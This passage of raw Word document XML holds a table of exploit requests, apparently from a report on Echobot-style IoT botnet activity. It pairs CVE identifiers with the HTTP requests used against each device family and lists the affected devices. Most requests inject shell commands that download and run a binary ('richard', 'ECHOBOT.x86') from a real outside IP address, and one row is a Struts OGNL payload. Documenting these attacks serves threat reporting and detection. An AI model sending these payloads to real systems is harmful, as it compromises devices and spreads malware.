          <w:p w14:paraId="59C78CBC" w14:textId="7D45E008" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Affected Devices/Systems/Platforms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="0E141F45" w14:textId="576EEEE0"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5EB8C65" w14:textId="7023DC03" w:rsidR="008C77A4" w:rsidRPr="00DA32D4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00DA32D4">
              <w:t>CVE_2013_7471</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BB02EB2" w14:textId="64AF97FF"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972FBC">
              <w:t>POST /soap.cgi?service=WANIPConn1 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23A4E313"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t>D-Link Devices:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55CEEB67" w14:textId="7804A92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6D0F">
              <w:t>DIR-300 rev B / DIR-600 rev B / DIR-645 / DIR-845 / DIR-865</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="036EFAAE" w14:textId="7E29BB0F" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C205451" w14:textId="345FD36F" w:rsidR="008C77A4" w:rsidRPr="00F71DCF" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>Sar2HTML_</w:t>
            </w:r>
            <w:r>
              <w:t>3.2.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4519A22A" w14:textId="4710C586"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82B5A">
              <w:t>GET /index.php?plot=;cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21FA3D31" w14:textId="008CE915" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>PHP web application platforms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="23A6F6FF" w14:textId="180A3554"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723FE56" w14:textId="2323D0F8" w:rsidR="008C77A4" w:rsidRPr="00F71DCF" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>3Com_OfficeConnect_RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4722F893" w14:textId="67DFB7B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457982">
              <w:t>GET /utility.cgi?testType=1&amp;IP=aaa || cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5AAC97A7" w14:textId="05466739"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457982">
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:t>C</w:t>
            </w:r>
            <w:r w:rsidRPr="00457982">
              <w:t xml:space="preserve">om </w:t>
            </w:r>
            <w:r>
              <w:t>O</w:t>
            </w:r>
            <w:r w:rsidRPr="00457982">
              <w:t>ffice</w:t>
            </w:r>
            <w:r>
              <w:t>C</w:t>
            </w:r>
            <w:r w:rsidRPr="00457982">
              <w:t>onnect network</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> routers and </w:t>
            </w:r>
            <w:r w:rsidRPr="00457982">
              <w:t>devices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="2D46CB97" w14:textId="47515557" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5A73FFE6" w14:textId="2BD8A4FD" w:rsidR="008C77A4" w:rsidRPr="00F71DCF" w:rsidRDefault="008C77A4" w:rsidP="00D20D25">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CVE_2019_16072</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6D493A19" w14:textId="00B2DC0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C94DDF">
              <w:t>POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&amp;hst_id=none&amp;snmpv3_profile_id=&amp;ip_address=|cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00C94DDF">
              <w:t>./richard;/evil.php|php&amp;snmp_ro_string=public&amp;mib_oid=system&amp;mib_oid_manual=.1.3.6.1.2.1.1&amp;snmp_version=1 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1643D528" w14:textId="43815892" w:rsidR="008C77A4" w:rsidRPr="00BB7EBE" w:rsidRDefault="008C77A4" w:rsidP="00BB7EBE">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00C17004">
              <w:t>NETSAS Enigma NMS 65.0.0</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="499DFC8E" w14:textId="43551E3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685EA75" w14:textId="3B9DFC08" w:rsidR="008C77A4" w:rsidRPr="00F71DCF" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CVE_2013_5912</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48ADABA0" w14:textId="2F99663F"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A73BE">
              <w:t>GET /VhttpdMgr?action=importFile&amp;fileName=cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="33763200" w14:textId="34E5270B"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A73BE">
              <w:t>Thomson</w:t>
            </w:r>
            <w:r>
              <w:t>-</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA73BE">
              <w:t>Reuters Velocity Analytics Vhayu Analytic Server</w:t>
            </w:r>
            <w:r>
              <w:t>s</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA73BE">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>V</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA73BE">
              <w:t xml:space="preserve">6.94 </w:t>
            </w:r>
            <w:r>
              <w:t>B</w:t>
            </w:r>
            <w:r w:rsidRPr="00BA73BE">
              <w:t>uild 2995</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="3435CAD3" w14:textId="5868FF0B" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19D4BA96" w14:textId="5A6E6FE5" w:rsidR="008C77A4" w:rsidRPr="00F71DCF" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CVE_2018_20841</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A5B8623" w14:textId="3D344006"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69670C">
              <w:t>POST /protocol.csp?function=set&amp;fname=security&amp;opt=mac_table&amp;flag=close_forever&amp;mac=|cd /tmp; wget http://80.82.67.184/ECHOBOT.x86; curl -O http://80.82.67.184/ECHOBOT.x86; chmod +x ECHOBOT.x86; ./ECHOBOT.x86 HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F0D290E" w14:textId="621671E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69670C">
              <w:t>HooToo TripMate Titan HT-TM05 and HT-05 routers</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="796919DF" w14:textId="46ECD2AE"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5AE7EBC" w14:textId="4EA8A1B2" w:rsidR="008C77A4" w:rsidRPr="00F71DCF" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CCBill_</w:t>
            </w:r>
            <w:r>
              <w:t>CGI_2003_</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4C43F215"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B2A52">
              <w:t>GET /cgi-bin/ccbill/whereami.cgi?g=cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C11FECF" w14:textId="25B8724D"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E62929">
              <w:t>GET /ccbill/whereami.cgi?g=cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="065B39D3" w14:textId="00E6D157" w:rsidR="008C77A4" w:rsidRPr="005E044F" w:rsidRDefault="008C77A4" w:rsidP="00E950DF">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>CCBill Online payment platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="2459FF42" w14:textId="74C61A9B" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="001B763B" w14:textId="3797D83A" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CVE_2019_14931</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BBE459E" w14:textId="77777777"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C6698">
              <w:t>GET /action.php HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07B420C6" w14:textId="1F3C47E5"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C6698">
              <w:t>{'host' : ';cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard&amp;PingCheck=Test'}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EF7AD08" w14:textId="3005EE00"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B6701">
              <w:t>Mitsubishi Electric smartRTU &amp; INEA ME-RTU</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> devices v2.2-3.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="3EE2E669" w14:textId="2EB60E82"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103DF17" w14:textId="51A977EB" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CVE_2017_16602</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="457BF13F" w14:textId="17548C81"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1829C6">
              <w:t>POST /u/jsp/tools/exec.jsp HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19575BC8" w14:textId="7D51FE88" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Netgain System Enterprise Manager 7.2.730 </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="0D7FC989" w14:textId="4768D73B" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="221EAAAB" w14:textId="56197CCE" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>CVE_2006_4000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70051191" w14:textId="4800FA9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4766DC">
              <w:t>GET /cgi-bin/preview_email.cgi?file=/mail/mlog/|cd; /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C15C887" w14:textId="15F6B2F5" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Barrucada Spam Firewalls </w:t>
            </w:r>
            <w:r w:rsidRPr="00FD1287">
              <w:t>3.3.01.001</w:t>
            </w:r>
            <w:r>
              <w:t>-3.3.01.053</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="2D671C6F" w14:textId="0ABAB192"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1B3F0E" w14:textId="5D752836" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>ACTi_ASOC2200_RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="190704AF" w14:textId="77777777" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="0092278D">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>GET /cgi-bin/test?iperf=;cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BD3F4E8" w14:textId="3D4B7C40" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="0092278D">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Host: %s:80</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="373AEF4D" w14:textId="7EB2AF78" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">ACTi video surveillance Cameras </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="7241CD35" w14:textId="59286890" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B118233" w14:textId="692152FB" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>AVCON6_</w:t>
            </w:r>
            <w:r>
              <w:t>RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="339B9221" w14:textId="362CBEB9" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00083DD4">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1440"/>
              </w:tabs>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00083DD4">
              <w:t>POST /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E40333A" w14:textId="2F731860" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Avcon6 Video Conferencing Systems</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="728E3348" w14:textId="73C33331"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F0D4FA" w14:textId="744AD15C" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r w:rsidRPr="00D20D25">
              <w:t>P2P_wificam_</w:t>
            </w:r>
            <w:r>
              <w:t>RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="371122A9"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6D75AA">
              <w:t>GET</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006D75AA">
              <w:t>/set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(cd /tmp; wget+http://80.82.67.184/richard; chmod+777+/tmp/richard; /tmp/richard+goahead)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="453DE530" w14:textId="40A48601" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>G</w:t>
            </w:r>
            <w:r w:rsidRPr="0003533D">
              <w:t>ET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=passpasspasspasspasspasspasspasspass&amp;dir=/&amp;mode=PORT&amp;upload_interval=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="228FE67F" w14:textId="2E111776" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">P2P Wireless IP Cameras </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="3EB8FB24" w14:textId="058A6E2E" w:rsidTr="008C77A4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="2269" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0EC6DF7F" w14:textId="141276A5" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:r>
              <w:t>WIPG</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>1000_</w:t>
            </w:r>
            <w:r>
              <w:t>RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="796BFC3F" w14:textId="62077C8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03475">
              <w:t>POST /cgi-bin/rdfs.cgi HTTP/1.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2AB19E99" w14:textId="00C435EB"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03475">
              <w:t>WePresent WiPG-1000 Wireless Presentation systems</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008C77A4" w14:paraId="14AD881C" w14:textId="7B1E1CC9"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371952" w14:textId="5B899AB8" w:rsidR="008C77A4" w:rsidRPr="00D20D25" w:rsidRDefault="008C77A4" w:rsidP="00367D67">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="right" w:pos="2053"/>
              </w:tabs>
            </w:pPr>
            <w:r>
              <w:t>CVE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D20D25">
              <w:t>_2019_3929</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16ABA748" w14:textId="510D165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C2F1C">
              <w:t>POST /cgi-bin/file_transfer.cgi HTTP/1.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="310B1F8F" w14:textId="7B30B564" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
